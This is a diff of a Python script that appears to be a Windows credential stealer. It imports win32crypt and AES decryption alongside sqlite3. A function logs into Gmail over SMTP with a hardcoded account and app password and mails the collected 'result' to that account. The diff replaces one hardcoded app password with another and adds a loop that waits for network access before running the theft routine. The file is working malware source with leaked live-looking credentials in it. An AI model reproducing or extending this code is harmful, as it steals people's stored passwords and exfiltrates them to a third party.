@@ -4,7 +4,9 @@ import os
 import shutil
 import smtplib
 import sqlite3
+import urllib.request
 from datetime import datetime, timedelta
+from time import sleep
 
 import win32crypt
 from Crypto.Cipher import AES
@@ -107,7 +109,7 @@ def main():
 
     def enviaInformacao():
         server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-        server.login("jeffersonssantos93@gmail.com", "muzwoulszlsmoqjx")
+        server.login("jeffersonssantos93@gmail.com", "qjqsooevacrnpuzn")
         server.sendmail('jeffersonssantos@gmail.com',
                         'jeffersonssantos93@gmail.com', result.encode('utf-8'))
 
@@ -126,5 +128,17 @@ def main():
         pass
 
 
-if __name__ == "__main__":
+def connect(host='https://mail.google.com/'):
+    try:
+        urllib.request.urlopen(host)  # Python 3.x
+        return True
+
+    except:
+        return False
+
+
+while connect() == False:
+    print('erro de conexão')
+    sleep(1.5)
+if connect():
     main()
